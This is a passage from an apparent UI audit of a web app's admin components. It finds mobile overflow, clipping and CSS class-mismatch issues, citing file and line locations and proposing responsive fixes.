Tables on mobile (acceptable because wrapped in overflow-x:auto):
  - AccessUserManager.tsx:474  <div style={{ overflowX: "auto" }}>
    9-column user table inside. Horizontal scroll on mobile.
    Touch-scroll works. Acceptable.
  - AccessUserManager.tsx:240-265  logs table.
    maxHeight:500, overflowY:auto on wrapper, NO overflowX.
    5 columns (Time/User/Action/IP/Details) at 8px padding.
    Time column alone can be ~150px ("۲۳/۰۴/۱۴۰۴، ۱۴:۳۲:۱۵" in
    fa-IR locale). Total table width ~600px on narrow content.
    Without overflowX:auto on wrapper, table will overflow its
    container → clipped by body overflow-x:hidden.
    On mobile, IP and Details columns may be invisible.

VERDICT: Shell is responsive but several sub-components use fixed
  multi-column inline grids with no mobile breakpoint, creating
  cramped layouts at <600px. StatsDashboard is the only inline-grid
  component that uses auto-fit minmax (works on mobile).

    * .settings-input: 13px
    * login inputs: 13px
    * AccessUserManager inputStyle: 12px
    * AparatClipManager inputStyle: 12px

    with font-size<16px is focused, to make the input readable.

----- F-D. .admin-tabs / .content-manager-type-tabs class mismatch
       [LOW, latent bug] -----
Location:
  - src/components/ContentManager.tsx:184 uses className="admin-tabs"
  - src/app/personal.css:1656-1678 defines .admin-tabs (no flex-wrap,
    no overflow-x)
  - src/app/personal.css:2504-2510 defines .content-manager-type-tabs
    (has flex-wrap:wrap) — but this class is never used

Analysis:
  - The CSS file defines a purpose-built class with flex-wrap for
    the ContentManager type tabs, but the component uses the
    generic .admin-tabs class instead.
  - Result: on mobile, ContentManager tabs neither scroll nor wrap
    → tabs beyond viewport are clipped by body overflow-x:hidden
    → invisible/unreachable.
  - This looks like an incomplete refactor: the .content-manager-
    type-tabs class was added but the component was never updated
    to use it.

Cross-reference: Q2 finding.

----- F-E. Body overflow-x:hidden is a band-aid  [MED, design] -----
Location: src/app/personal.css:151

Analysis:
  - body { overflow-x: hidden } is used to hide horizontal overflow
    from 5 sources identified in Q5.
  - This MASKS the problem rather than fixing it: content wider
    than viewport is CLIPPED, not scrollable. Users on mobile
    cannot reach clipped content (e.g., theme buttons, captcha
    privacy links, hidden admin tabs).
  - The CORRECT fix is to make each overflow source either:
    (a) responsive (re-flow to single column on mobile), or
    (b) wrap in its own overflow-x:auto container so it scrolls
        locally without affecting page width.
  - Side effects of body overflow-x:hidden:
    * Sticky positioning can break in some browsers when an
      ancestor has overflow:hidden. .about-card (position:sticky,
      personal.css:702) is inside body, but body overflow-x:hidden
      should be OK (sticky breaks on overflow-y:hidden, not -x).
    * Position:fixed elements relative to body still work.
  - Removing this band-aid without fixing the 5 overflow sources
    would expose horizontal page scroll on every mobile visit.

Cross-reference: Q5 finding.
